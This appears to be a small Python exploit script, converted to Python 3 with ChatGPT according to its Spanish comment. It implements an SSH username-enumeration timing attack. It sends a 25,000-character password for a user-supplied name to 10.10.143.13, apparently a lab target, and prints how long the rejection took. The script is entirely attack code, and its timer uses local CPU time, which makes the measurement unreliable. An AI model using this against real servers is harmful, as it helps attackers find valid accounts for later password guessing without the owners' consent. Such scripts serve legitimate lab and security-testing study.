# codigo convertido con chatgpt, de python2 a python3
import paramiko
import time

user = input("user: ")
p = 'A' * 25000

ssh = paramiko.SSHClient()
starttime = time.process_time()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    ssh.connect('10.10.143.13', username=user, password=p)
except Exception as e:
    endtime = time.process_time()
    total = endtime - starttime
    print(total)
    print(str(e))
finally:
    ssh.close()